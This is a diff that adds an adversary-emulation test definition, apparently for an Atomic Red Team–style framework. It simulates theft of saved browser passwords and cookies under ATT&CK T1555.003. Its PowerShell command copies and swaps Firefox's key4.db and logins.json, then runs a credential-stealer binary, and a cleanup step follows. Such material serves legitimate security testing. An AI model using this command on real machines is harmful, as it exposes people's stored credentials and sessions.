@@ -1,0 +1,36 @@
+---
+- id: b267badd4e6f3601450582cb07d9f333
+  name: BrowserStealer (Chrome / Firefox / Microsoft Edge)
+  description: '[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple
+    password/cookies stealer for chrome, edge, and gecko based browsers (30 listed
+    working). This attack simulates stealing the data from the browser files and printing
+    them to the command line.
+
+    If using to test with Firefox, if the browser is x64 you need to use the x64 build
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
+  platforms:
+    windows:
+      psh:
+        command: $profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName;
+          Copy-Item $profile\key4.db -Destination "PathToAtomicsFolder\..\ExternalPayloads"
+          > $null; Copy-Item $profile\logins.json -Destination "PathToAtomicsFolder\..\ExternalPayloads"
+          > $null; Remove-Item $profile\key4.db > $null; Remove-Item $profile\logins.json
+          > $null; Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\key4.db" -Destination
+          $profile\ > $null; Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\logins.json"
+          -Destination $profile\ > $null; cd "$env:PathToAtomicsFolder\T1555.003\bin";
+          ""|.\BrowserCollector.exe
+        payloads: []
+        cleanup: $profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName;
+          Remove-Item $profile\key4.db > $null; Remove-Item $profile\logins.json >
+          $null; Copy-Item "PathToAtomicsFolder\..\ExternalPayloads" -Destination
+          $profile\ > $null; Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\key4.db"
+          > $null; Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\logins.json"
+          > $null
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
